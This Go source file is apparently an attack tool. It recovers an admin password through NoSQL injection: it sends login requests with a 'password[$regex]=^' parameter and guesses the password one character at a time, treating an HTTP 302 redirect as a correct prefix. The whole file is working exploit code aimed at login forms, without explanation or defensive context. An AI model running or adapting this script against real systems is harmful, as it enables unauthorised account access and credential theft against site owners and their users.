
package main

import (
	"bytes"
	"fmt"
	"net/http"
)

var (
	url      = "http://example.com"
	port     = ""
	username = "admin"
	password = ""
	c        = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#%'()+,-:;<=>?@[]^_`{|}~"
	code     = 0
)

func fuzz() {

	for {
		for _, s := range c {

			reqbody := []byte("username=" + username + "&password[$regex]=^" + password + string(s) + "&login=login")
			code := makeRequest(reqbody)
			if code == 302 {
				password += string(s)
				fmt.Println(password)
				break
			}

		}

	}

	fmt.Printf(password)
}

func makeRequest(reqbody []byte) int {

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(reqbody))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	return resp.StatusCode

}

func main() {

	fmt.Println("Enumerating...")

	fuzz()

}
